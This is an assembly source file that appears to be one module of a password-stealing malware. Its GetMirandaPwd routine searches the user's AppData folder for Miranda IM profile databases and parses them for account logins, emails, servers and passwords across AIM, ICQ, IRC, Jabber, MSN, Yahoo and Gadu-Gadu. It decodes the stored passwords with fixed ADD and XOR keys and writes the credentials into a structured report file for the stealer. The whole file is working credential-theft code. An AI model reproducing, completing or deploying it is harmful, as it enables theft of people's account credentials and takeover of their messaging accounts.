     
     MIRANDA_DATATYPE_AIM          equ 00h
     MIRANDA_DATATYPE_GG           equ 01h
     MIRANDA_DATATYPE_ICQ          equ 02h
     MIRANDA_DATATYPE_IRC          equ 03h
     MIRANDA_DATATYPE_JABBER       equ 04h
     MIRANDA_DATATYPE_MSN          equ 05h
     MIRANDA_DATATYPE_YAHOO        equ 06h
     MIRANDA_DECRYPT_ADD           equ 00h
     MIRANDA_DECRYPT_XOR           equ 01h
     
     DBVT_DELETED                  equ 0
     DBVT_BYTE                     equ 1
     DBVT_WORD                     equ 2
     DBVT_DWORD                    equ 4
     DBVT_ASCIIZ                   equ 255
     DBVT_BLOB                     equ 254
     DBVT_UTF8                     equ 253
     DBVT_WCHAR                    equ 252
     
.data?
     MirandaAppData    db 200h dup (?)
     MirandaTmpBuf1    db 200h dup (?)
     MirandaTmpBuf2    db 200h dup (?)
     miranda_protocol  db 100h dup (?)
     miranda_login     db 100h dup (?)
     miranda_pwd       db 100h dup (?)
     miranda_server    db 100h dup (?)
     miranda_email     db 100h dup (?)
     mfd               WIN32_FIND_DATA <>
     align 4
     ACCOUNT_TYPE      db ?
     align 4
     miranda_valname   db 100h dup (?)
     
.code

miranda_decrypt_pwd proc uses ecx edi edx lpPwd:DWORD, crypttype:DWORD, keybyte:DWORD
      LOCAL   pwdlen:DWORD
      pushad
      lstrlen, lpPwd
      mov     pwdlen, eax
      cmp     pwdlen, 0
      je      miranda_no_decrypt
      xor     eax, eax
      mov     ecx, dword ptr [lpPwd]
      movzx   edx, byte ptr [keybyte]
    miranda_decrypt_lp:
      .if     crypttype == MIRANDA_DECRYPT_ADD
              add     byte ptr [ecx+eax], dl
      .elseif crypttype == MIRANDA_DECRYPT_XOR
              xor     byte ptr [ecx+eax], dl
      .endif
      inc     eax
      cmp     eax, pwdlen
      jb      miranda_decrypt_lp
    miranda_no_decrypt:
      ret
miranda_decrypt_pwd endp

miranda_get_string proc uses esi val_name:DWORD, lpMem:DWORD, lpOut:DWORD
      LOCAL   hvalname,cmprez:DWORD
      
      mov     hvalname, 0
      mov     esi, dword ptr [lpMem]
      
    mir_get_str_lp:
      lodsbza
      .if     eax != 0
              pushad
              lea     ecx, dword ptr [eax+1]
              HeapAlloc, hHeap, HEAP_ZERO_MEMORY, ecx
              mov     hvalname, eax
              popad
              pushad
              RtlMoveMemory, hvalname, esi, eax
              popad
              add     esi, eax
              lodsbza
              .if     eax == DBVT_DELETED
                      pushad
                      HeapFree, hHeap, 0, hvalname
                      popad
                      jmp     mir_get_str_lp
              .elseif eax == DBVT_BYTE
                      pushad
                      lstrcmpi, val_name, hvalname
                      mov     cmprez, eax
                      popad
                      .if     cmprez == 0
                              lodsbza
                              push    eax
                              push    offset miranda_smask2
                              push    dword ptr [lpOut]
                              call    wsprintf
                              add     esp, 3*4
                              jmp     getstr_faild
                      .else
                              inc     esi
                      .endif
              .elseif eax == DBVT_WORD
                      pushad
                      lstrcmpi, val_name, hvalname
                      mov     cmprez, eax
                      popad
                      .if     cmprez == 0
                              lodswza
                              push    eax
                              push    offset miranda_smask2
                              push    dword ptr [lpOut]
                              call    wsprintf
                              add     esp, 3*4
                              jmp     getstr_faild
                      .else
                              add     esi, 2
                      .endif
              .elseif eax == DBVT_DWORD
                      pushad
                      lstrcmpi, val_name, hvalname
                      mov     cmprez, eax
                      popad
                      .if     cmprez == 0
                              lodsd
                              push    eax
                              push    offset miranda_smask2
                              push    dword ptr [lpOut]
                              call    wsprintf
                              add     esp, 3*4
                              jmp     getstr_faild
                      .else
                              add     esi, 4
                      .endif
              .elseif ( eax == DBVT_ASCIIZ ) || ( eax ==  DBVT_UTF8 )
                      lodswza
                      pushad
                      lstrcmpi, val_name, hvalname
                      mov     cmprez, eax
                      popad
                      .if     cmprez == 0
                              .if     eax > 0
                                      ; win, copy shit and gtfo
                                      pushad
                                      RtlMoveMemory, lpOut, esi, eax
                                      popad
                              .else
                                      ; fail, write to lpOut some zeroes
                                      mov     eax, dword ptr [lpOut]
                                      mov     dword ptr [eax], 0
                              .endif
                              jmp     getstr_faild
                      .else
                              add     esi, eax
                      .endif
              .elseif eax == DBVT_BLOB
                      lodswza
                      add     esi, eax
              .endif
      .else
              jmp     getstr_faild
      .endif
      .if     hvalname != 0
              HeapFree, hHeap, 0, hvalname
      .endif
      jmp     mir_get_str_lp
      
    getstr_faild:
      .if     hvalname != 0
              HeapFree, hHeap, 0, hvalname
      .endif
      ret
miranda_get_string endp

GetMirandaPwd proc
      LOCAL   WTF:DWORD
      LOCAL   hFind :DWORD
      LOCAL   local3 :DWORD
      LOCAL   local4 :DWORD
      LOCAL   local5 :DWORD
      LOCAL   local6 :DWORD
      LOCAL   hUin :DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], MIRANDA_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetMirandaPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      mov     byte ptr [MirandaAppData], 0
      push    0
      push    CSIDL_APPDATA
      push    offset MirandaAppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      test    eax, eax
      je      miranda_fail_1
      
      lstrcpy, addr MirandaTmpBuf1, addr MirandaAppData
      lstrcat, addr MirandaTmpBuf1, addr miranda_str_1
      lstrcat, addr MirandaTmpBuf1, addr wildc
      
      FindFirstFile, addr MirandaTmpBuf1, addr mfd
      mov     dword ptr [hFind], eax
      cmp     eax, -1
      je      miranda_fail_2
      
      lstrlen, addr MirandaTmpBuf1
      mov     byte ptr [MirandaTmpBuf1 + eax - 1], 0
      
      jmp     miranda_skip_search
    miranda_search_lp:
      lstrcmp, addr mfd.cFileName, addr fake1
      test    eax, eax
      je      miranda_skip_search
      lstrcmp, addr mfd.cFileName, addr fake2
      test    eax, eax
      je      miranda_skip_search
      
      push    offset mfd.cFileName
      push    offset mfd.cFileName
      push    offset MirandaTmpBuf1
      push    offset miranda_smask
      push    offset MirandaTmpBuf2
      call    wsprintf
      add     esp, 5*4
      
      invoke  MapFile, addr MirandaTmpBuf2, addr mfile, MAP_FILE_A
      test    eax, eax
      je      miranda_skip_search
      mov     eax, mfile.dwFileSize
      sub     eax, 3
      mov     local4, eax
      mov     ebx, mfile.lpMem
      
      ; local1 == ebx
      xor     edx, edx
      mov     local3, edx
      mov     eax, local4
      xor     esi, esi
      cmp     eax, esi
      jbe     miranda_total_shit
    miranda_parse_lp:
      lea     esi, dword ptr [ebx+edx]
      mov     ecx, 3
      mov     edi, offset dwords_3
      xor     eax, eax
      repe    cmpsd
      jne     miranda_skip_dunno
      lea     esi, dword ptr [edx+ebx+0Dh]
      movsx   edi, word ptr [esi]
      add     esi, 2
      pushad
      RtlMoveMemory, addr miranda_protocol, esi, edi
      popad
      movsx   eax, word ptr [miranda_protocol]
      .if     ax == 'IA' ; AIM
              mov     ACCOUNT_TYPE, MIRANDA_DATATYPE_AIM
              add     esi, edi
              invoke  miranda_get_string, addr miranda_aim_login, esi, addr miranda_login
              invoke  miranda_get_string, addr miranda_pwd1, esi, addr miranda_pwd
              inc     esi
              invoke  miranda_decrypt_pwd, addr miranda_pwd, MIRANDA_DECRYPT_ADD, 0FBh
      .elseif ax == 'GG' ; GG
              mov     ACCOUNT_TYPE, MIRANDA_DATATYPE_GG
              add     esi, edi
              invoke  miranda_get_string, addr miranda_uin1, esi, addr miranda_login
              invoke  miranda_get_string, addr miranda_pwd1, esi, addr miranda_pwd
              invoke  miranda_get_string, addr miranda_email1, esi, addr miranda_email
              inc     esi
              invoke  miranda_decrypt_pwd, addr miranda_pwd, MIRANDA_DECRYPT_ADD, 0FBh
      .elseif ax == 'CI' ; ICQ
              mov     ACCOUNT_TYPE, MIRANDA_DATATYPE_ICQ
              add     esi, edi
              invoke  miranda_get_string, addr miranda_uin1, esi, addr miranda_login
              invoke  miranda_get_string, addr miranda_pwd1, esi, addr miranda_pwd
              inc     esi
              invoke  miranda_decrypt_pwd, addr miranda_pwd, MIRANDA_DECRYPT_ADD, 0FBh
      .elseif ax == 'RI' ; IRC
              mov     ACCOUNT_TYPE, MIRANDA_DATATYPE_IRC
              add     esi, edi
              invoke  miranda_get_string, addr miranda_servername1, esi, addr miranda_server
              invoke  miranda_get_string, addr miranda_pwd1, esi, addr miranda_pwd
              invoke  miranda_get_string, addr miranda_nick1, esi, addr miranda_login
              inc     esi
              invoke  miranda_decrypt_pwd, addr miranda_pwd, MIRANDA_DECRYPT_ADD, 0FBh
      .elseif ax == 'AJ' ; JABBER
              mov     ACCOUNT_TYPE, MIRANDA_DATATYPE_JABBER
              add     esi, edi
              invoke  miranda_get_string, addr miranda_jabber_login, esi, addr miranda_login
              invoke  miranda_get_string, addr miranda_jabber_pwd, esi, addr miranda_pwd
              invoke  miranda_get_string, addr miranda_jabber_server, esi, addr miranda_server
              inc     esi
              invoke  miranda_decrypt_pwd, addr miranda_pwd, MIRANDA_DECRYPT_XOR, 0C3h
      .elseif ax == 'SM' ; MSN
              mov     ACCOUNT_TYPE, MIRANDA_DATATYPE_MSN
              add     esi, edi
              invoke  miranda_get_string, addr miranda_email1, esi, addr miranda_login
              invoke  miranda_get_string, addr miranda_pwd1, esi, addr miranda_pwd
              inc     esi
              invoke  miranda_decrypt_pwd, addr miranda_pwd, MIRANDA_DECRYPT_ADD, 0FBh
      .elseif ax == 'AY' ; YAHOO
              mov     ACCOUNT_TYPE, MIRANDA_DATATYPE_YAHOO
              add     esi, edi
              invoke  miranda_get_string, addr miranda_yahoo_login, esi, addr miranda_login
              invoke  miranda_get_string, addr miranda_pwd1, esi, addr miranda_pwd
              inc     esi
              invoke  miranda_decrypt_pwd, addr miranda_pwd, MIRANDA_DECRYPT_ADD, 0FBh
      .else
              jmp     miranda_skip_dunno
      .endif
     
    miranda_jabber_parse_done:
      
      pushad
      
      ; Protocol
      add     dword ptr [DataSize], sizeof ACCOUNT_TYPE
      WriteFile, stfile, addr ACCOUNT_TYPE, sizeof ACCOUNT_TYPE, addr SNW, NULL
      lstrlen, addr miranda_protocol
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PROTOCOL
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr miranda_protocol, plen, addr SNW, NULL
      
      .if     ACCOUNT_TYPE == MIRANDA_DATATYPE_GG
              add     dword ptr [DataSize], sizeof ACCOUNT_TYPE
              WriteFile, stfile, addr ACCOUNT_TYPE, sizeof ACCOUNT_TYPE, addr SNW, NULL
              lstrlen, addr miranda_email
              mov     dword ptr [plen], eax
              add     dword ptr [DataSize], sizeof plen
              add     dword ptr [DataSize], eax
              WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
              mov     byte ptr [data_type], REPORT_DATA_EMAIL
              add     dword ptr [DataSize], sizeof data_type
              WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
              WriteFile, stfile, addr miranda_email, plen, addr SNW, NULL
      .endif
      
      .if     ( ACCOUNT_TYPE == MIRANDA_DATATYPE_JABBER ) || ( ACCOUNT_TYPE == MIRANDA_DATATYPE_IRC )
              add     dword ptr [DataSize], sizeof ACCOUNT_TYPE
              WriteFile, stfile, addr ACCOUNT_TYPE, sizeof ACCOUNT_TYPE, addr SNW, NULL
              lstrlen, addr miranda_server
              mov     dword ptr [plen], eax
              add     dword ptr [DataSize], sizeof plen
              add     dword ptr [DataSize], eax
              WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
              mov     byte ptr [data_type], REPORT_DATA_SERVER
              add     dword ptr [DataSize], sizeof data_type
              WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
              WriteFile, stfile, addr miranda_server, plen, addr SNW, NULL
      .endif
      
      ; Login
      add     dword ptr [DataSize], sizeof ACCOUNT_TYPE
      WriteFile, stfile, addr ACCOUNT_TYPE, sizeof ACCOUNT_TYPE, addr SNW, NULL
      lstrlen, addr miranda_login
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr miranda_login, plen, addr SNW, NULL
      
      ; Password
      add     dword ptr [DataSize], sizeof ACCOUNT_TYPE
      WriteFile, stfile, addr ACCOUNT_TYPE, sizeof ACCOUNT_TYPE, addr SNW, NULL
      lstrlen, addr miranda_pwd
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr miranda_pwd, plen, addr SNW, NULL
      
      RtlZeroMemory, addr miranda_protocol, sizeof miranda_protocol
      RtlZeroMemory, addr miranda_login, sizeof miranda_login
      RtlZeroMemory, addr miranda_pwd, sizeof miranda_pwd
      RtlZeroMemory, addr miranda_server, sizeof miranda_server
      
      popad
      
    miranda_skip_dunno:
      mov     edx, local3
      inc     edx
      mov     local3, edx
      cmp     edx, local4
      jb      miranda_parse_lp
      
    miranda_total_shit:
      invoke  UnmapFile, addr mfile
      
    miranda_skip_search:
      FindNextFile, hFind, addr mfd
      test    eax, eax
      jne     miranda_search_lp
      FindClose, hFind
      
    miranda_fail_2:
      
    miranda_fail_1:
      
    GetMirandaPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetMirandaPwd endp
